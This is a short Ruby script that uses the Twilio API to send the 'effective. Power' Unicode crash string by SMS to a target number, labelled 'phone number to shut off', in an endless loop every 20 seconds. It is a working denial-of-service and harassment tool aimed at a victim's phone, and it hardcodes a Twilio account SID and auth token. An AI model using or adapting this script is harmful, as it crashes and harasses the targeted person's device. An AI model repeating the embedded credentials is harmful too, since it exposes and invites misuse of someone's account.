require 'rubygems'
require 'twilio-ruby'

account_sid = "AC10af7a17db71b2e54e67080a5d2be447"
auth_token = "ccc06871807a282cc52970722deb915e"
client = Twilio::REST::Client.new account_sid, auth_token

from = "+12316741016" # Your Twilio number

friends = {
"+phone number to shut off" => "Friend"
}

while true
  friends.each do |key, value|
    client.account.messages.create(
      :from => from,
      :to => key,
      :body => "effective. 
Power
لُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ
冗"
  )
  puts "Sent message to #{value}"

  end
  sleep(20)

end
